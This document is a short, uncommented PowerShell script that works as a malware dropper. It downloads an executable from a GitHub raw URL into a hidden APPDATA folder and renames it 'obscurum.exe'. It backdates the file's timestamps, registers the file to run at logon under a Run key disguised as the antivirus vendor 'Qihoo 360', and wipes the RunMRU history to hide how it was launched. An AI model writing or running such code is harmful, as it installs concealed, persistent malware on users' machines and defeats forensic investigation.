$TargetDir = $env:APPDATA + "\Data\0fdfe2b959c25a84db17412f08390864\"
$TargetPath = $TargetDir + "obscurum.exe"

mkdir $TargetDir
curl "https://raw.githubusercontent.com/mohamedali43/ps1/main/test.exe" -o $TargetPath

(Get-Item $TargetPath).CreationTime=("4 July 2024 5:50:00")
(Get-Item $TargetPath).LastWriteTime=("4 July 2024 5:50:00")
(Get-Item $TargetPath).LastAccessTime=("16 July 2024 17:19:00")

$RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$Name = "Qihoo 360"
New-ItemProperty -Path $RegistryPath -Name $Name -Value $TargetPath -PropertyType String -Force 

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
$values = Get-ItemProperty -Path $regPath

foreach ($valueName in $values.PSObject.Properties.Name) {
    if ($valueName -ne "(default)")
    {
        Remove-ItemProperty -Path $regPath -Name $valueName -ErrorAction SilentlyContinue
    }
}
